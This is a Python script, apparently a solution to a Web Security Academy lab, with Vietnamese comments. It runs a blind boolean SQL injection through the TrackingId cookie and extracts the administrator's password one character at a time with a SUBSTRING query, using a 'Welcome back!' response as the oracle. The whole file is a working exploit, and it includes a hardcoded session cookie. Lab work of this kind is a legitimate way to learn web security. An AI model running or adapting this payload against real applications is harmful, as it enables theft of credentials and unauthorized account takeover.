import requests
import string

# Cấu hình mục tiêu
BASE_URL = "https://0ae9007104d9459986bd6cb90075001a.web-security-academy.net/"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": BASE_URL,
}
COOKIES = {"session": "z2xGlrJ8tLj4KYvAk2VWk83GDunzd7Uj"}

# Danh sách ký tự có thể có trong password
CHARSET = string.ascii_letters + string.digits

# Hàm kiểm tra ký tự tại vị trí index
def check_char(index, char):
    payload = f"Ggky8FU6ymNOrQm2' AND substring((SELECT password FROM users WHERE username='administrator'),{index},1)='{char}'--"
    COOKIES["TrackingId"] = payload
    response = requests.get(BASE_URL, headers=HEADERS, cookies=COOKIES)
    return "Welcome back!" in response.text

# Hàm brute-force password
def brute_force_password():
    password = ""
    index = 1
    while True:
        found = False
        for char in CHARSET:
            if check_char(index, char):
                password += char
                print(f"[+] Found character {index}: {char}")
                index += 1
                found = True
                break
        if not found:
            break
    return password

if __name__ == "__main__":
    password = brute_force_password()
    print(f"[+] Administrator password: {password}")
